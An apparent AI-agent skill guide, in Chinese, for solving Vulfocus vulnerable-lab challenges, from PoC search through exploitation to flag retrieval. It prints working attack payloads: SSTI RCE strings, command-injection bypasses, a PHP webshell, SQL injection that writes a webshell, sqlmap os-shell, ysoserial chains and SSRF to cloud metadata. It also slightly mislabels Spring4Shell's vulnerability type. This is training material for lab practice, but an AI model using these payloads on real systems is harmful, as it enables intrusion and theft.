---
name: vulfocus_solve
description: >
  提供针对 Vulfocus 靶场的做题流程和思路，提供快速解题的能力，避免盲目尝试。
  适用于：刷 Vulfocus 靶场题目，包含漏洞信息收集、PoC 搜索与验证、Exploit 调整与执行、Flag 获取全流程。
---

# vulfocus_solve

提供快速解题能力，避免盲目尝试。按照"搜索 → 理解 → 验证 → 利用 → 获取 Flag"的标准流程执行。

---

## 总流程速览

```
题目信息识别
    ↓
第一步：搜索 WriteUp / Exp / PoC / CVE 资料
    ↓
第二步：验证 PoC 是否适用（指纹确认 + 探测）
    ↓
第三步：调整并执行 Exploit，获取命令执行权限
    ↓
第四步：获取 Flag（ls /tmp 或 env）
```

---

## Flag 位置说明

Vulfocus 靶场的 Flag 通常有以下两种形式，攻破目标后按顺序尝试：

| 方式 | 命令 | 示例结果 |
|------|------|---------|
| 文件名形式 | `ls /tmp` | `flag-{bmh45f96a27-5575-4599-86d2-ecf3751fc795}` |
| 环境变量形式 | `env` 或 `printenv` | `vul_flag=flag-{bmh...}` |
| PHP 站点 | 访问 `phpinfo()` 页面 | 在环境变量区域搜索 `flag` |

> **核心目标**：获得可执行任意命令的能力（RCE），然后执行 `ls /tmp` 和 `env`，从输出中提取 Flag。

---

## 第一步：优先搜索 WriteUp 和相关资料

**做题前必须先搜索，不要直接开始盲目尝试。**

### 1.1 搜索关键词策略

关键词要简短有效，按以下优先级依次尝试：

| 优先级 | 示例关键词 | 适用场景 |
|--------|-----------|---------|
| 1（最优先） | `CVE-XXXX-XXXXX exploit`、`CVE-XXXX-XXXXX poc` | 有明确 CVE 编号时 |
| 2 | `<题目名> WriteUp`、`<题目名> WP` | 搜索靶场专属解题记录 |
| 3 | `<题目名> 复现`、`<题目名> RCE` | 寻找漏洞复现文章 |
| 4 | `<中间件/框架> <版本> 漏洞`、`<中间件> SSTI`、`<中间件> 反序列化` | 只知道组件时 |

### 1.2 优先参考来源

- **GitHub**：搜索 CVE 编号，找 PoC 仓库（注意 Star 数和更新时间）
- **先知社区**（xz.aliyun.com）：中文漏洞分析质量较高
- **安全客**（anquanke.com）：CVE 分析文章
- **博客园 / CSDN**：复现类教程较多
- **Seebug**（seebug.org）：漏洞详情库
- **Exploit-DB**（exploit-db.com）：标准化 PoC 库
- **PacketStorm**：exploit 脚本存档

### 1.3 资料阅读要点

收集到资料后，需要确认以下信息才能进入下一步：

- [ ] **漏洞类型**：RCE / SSTI / 反序列化 / SQL注入 / 文件上传 / SSRF / 路径遍历 …
- [ ] **受影响版本**：确认靶场版本在漏洞范围内
- [ ] **触发条件**：需要认证？特定路由？特定参数？
- [ ] **Exploit 细节**：请求方式（GET/POST）、payload 格式、依赖工具

> ⚠️ 找到 PoC 后，**先理解原理再执行**，注意替换目标 IP 和端口。

---

## 第二步：验证 PoC 是否适用

在执行 Exploit 前，先做指纹确认，避免打错目标浪费时间。

### 2.1 快速指纹识别

```bash
# 查看响应头，识别服务器 / 框架信息
curl -I http://<TARGET_IP>:<PORT>/

# 查看页面内容，搜索版本号、框架标识
curl -s http://<TARGET_IP>:<PORT>/ | grep -iE "version|powered|x-frame|server"

# 常见路径探测
curl -s http://<TARGET_IP>:<PORT>/actuator         # Spring Boot
curl -s http://<TARGET_IP>:<PORT>/solr/admin/info/system  # Apache Solr
curl -s http://<TARGET_IP>:<PORT>/__clockwork/     # Laravel Clockwork
curl -s http://<TARGET_IP>:<PORT>/manager/html     # Tomcat Manager
```

### 2.2 版本确认方法

| 组件 | 版本确认方式 |
|------|------------|
| Apache Shiro | 登录页响应头含 `rememberMe=deleteMe`，或 Cookie 解密测试 |
| Spring Boot | 访问 `/actuator/env`、`/actuator/info` |
| Struts2 | 错误页面或 `struts.xml` 泄露 |
| Weblogic | 访问 `/console`，查看控制台版本 |
| Tomcat | 访问 `/manager/html`，错误页含版本 |
| Elasticsearch | 访问 `http://target:9200/`，JSON 返回版本 |
| Redis | `redis-cli -h <target> INFO server` |
| PHP | 访问 `phpinfo.php` 或错误页 |

### 2.3 漏洞可达性验证（无损探测）

在执行完整 Exploit 前，用无害请求验证漏洞触发点是否可达：

```bash
# SSRF / SSTI 类：发送 dnslog 探测是否有回显
# 工具推荐：http://dnslog.cn 或 https://app.interactsh.com

# 命令执行类：先尝试 sleep 确认延迟
# 若目标执行 sleep 5 后响应延迟 5 秒，说明 RCE 可用
curl -s --max-time 10 http://<TARGET>/<path> -d 'payload=sleep+5'

# 反序列化类：先用 ysoserial 生成 ping dnslog 的 payload 探测
```

---

## 第三步：编写和调整 Exploit，获取命令执行权限

### 3.1 常见漏洞类型与利用思路

#### 🔴 RCE / 命令注入

```bash
# 直接在 payload 中执行命令，优先尝试：
ls /tmp
env
id
cat /etc/passwd

# 若有空格过滤，尝试：
ls${IFS}/tmp
ls$IFS$9/tmp

# 若有关键词过滤，尝试拼接：
l''s /tmp
```

#### 🔴 SSTI（服务端模板注入）

```
# Jinja2 (Python/Flask)
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Velocity (Java)
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(...)
```

#### 🔴 反序列化（Java）

```bash
# 使用 ysoserial 生成 payload
java -jar ysoserial.jar CommonsCollections6 "ls /tmp" > payload.ser

# 常见链：CommonsCollections1/3/6，Spring1，Groovy1
# Weblogic 额外尝试：T3 协议，IIOP 协议
```

#### 🔴 文件上传 RCE

```
1. 上传 WebShell（PHP: <?php system($_GET['cmd']);?>）
2. 绕过方式：修改 Content-Type、双后缀(.php.jpg)、大小写(.PhP)、%00 截断
3. 上传成功后访问文件路径，带 ?cmd=ls+/tmp 执行命令
```

#### 🔴 SQL 注入 → 读文件 / 写 WebShell

```sql
-- 读文件
' UNION SELECT load_file('/etc/passwd')--

-- 写 WebShell（需要 FILE 权限和写权限）
' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--

-- sqlmap 自动化
sqlmap -u "http://target/page?id=1" --os-shell
sqlmap -u "http://target/page?id=1" --sql-query="SELECT load_file('/tmp/$(ls /tmp | head -1)')"
```

#### 🔴 SSRF → 内网探测 / 打 Redis / 打 Fastcgi

```bash
# 探测内网
http://127.0.0.1:6379/     # Redis
http://127.0.0.1:8080/     # 内网服务
http://169.254.169.254/    # AWS/GCP metadata

# 利用 Redis（通过 SSRF 发送 RESP 协议）
# 利用 Fastcgi（gopherus 工具生成 gopher 协议 payload）
gopherus --exploit fastcgi
```

### 3.2 工具速查

| 工具 | 用途 | 常用命令示例 |
|------|------|------------|
| `curl` | HTTP 请求调试 | `curl -v -X POST http://target/ -d 'data'` |
| `sqlmap` | SQL 注入自动化 | `sqlmap -u URL --dbs` |
| `ysoserial` | Java 反序列化 payload | `java -jar ysoserial.jar <链> <cmd>` |
| `gopherus` | SSRF Gopher payload 生成 | `gopherus --exploit redis` |
| `MSF` | 漏洞利用框架 | `use exploit/...; set RHOSTS; run` |
| `nuclei` | 漏洞扫描（含 PoC 验证） | `nuclei -u http://target -t cves/` |
| `BurpSuite` | 抓包改包 | 配合 Intruder/Repeater 调整 payload |


---

## 第四步：获取 Flag

获得命令执行能力后，按顺序执行：

```bash
# 1. 列出 /tmp 目录，Flag 文件名即为 flag
ls /tmp

# 2. 查看环境变量
env
printenv

# 3. 若 /tmp 目录权限受限，尝试：
find / -name "flag*" 2>/dev/null
find / -name "flag-*" 2>/dev/null

# 4. PHP 站点：访问 phpinfo() 页面，在页面搜索 "flag"
```

Flag 格式：`flag-{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`，找到后直接提交到 Vulfocus 平台。

---

## 常见问题排查

| 现象 | 可能原因 | 排查方向                                          |
|------|---------|-----------------------------------------------|
| PoC 执行无回显 | 命令执行成功但无回显（盲注） | 改用 sleep 测延时，或curl -d外带                 |
| 靶场返回 403/401 | 需要认证，或 WAF 拦截 | 查 WriteUp 是否需要先登录；尝试绕过 WAF                    |
| 漏洞路由 404 | 版本不匹配，或路径有偏差 | 重新确认题目版本；尝试路径变体                               |
| Flag 不在 /tmp | 部分题目使用环境变量 | 执行 `env`；PHP 题检查 phpinfo                      |
| Python 脚本报错 | 依赖缺失或 Python 版本问题 | `pip install -r requirements.txt`；检查 Python2/3 |
| 超时无响应 | 靶场容器未启动或端口错误 | 重新开启靶场实例；确认映射端口                               |

---

## 快速参考：常见题型对应 CVE

| 组件 | 常见漏洞 CVE | 漏洞类型 |
|------|------------|---------|
| Apache Log4j2 | CVE-2021-44228 (Log4Shell) | JNDI 注入 RCE |
| Spring Framework | CVE-2022-22965 (Spring4Shell) | 反序列化 RCE |
| Apache Shiro | CVE-2016-4437 | 反序列化 RCE |
| Fastjson | CVE-2017-18349 / CVE-2022-25845 | 反序列化 RCE |
| Struts2 | CVE-2017-5638 / CVE-2019-0230 | OGNL 注入 RCE |
| Weblogic | CVE-2019-2725 / CVE-2020-14882 | 反序列化 / 未授权 RCE |
| Drupal | CVE-2018-7600 (Drupalgeddon2) | RCE |
| ThinkPHP | CVE-2018-20062 / CVE-2019-9082 | RCE |
| Nginx + PHP | CVE-2019-11043 | PHP-FPM RCE |
| Confluence | CVE-2022-26134 | OGNL 注入 RCE |
| Redis | CVE-2022-0543 | Lua 沙箱逃逸 RCE |
| Jenkins | CVE-2019-1003000 | 脚本安全绕过 RCE |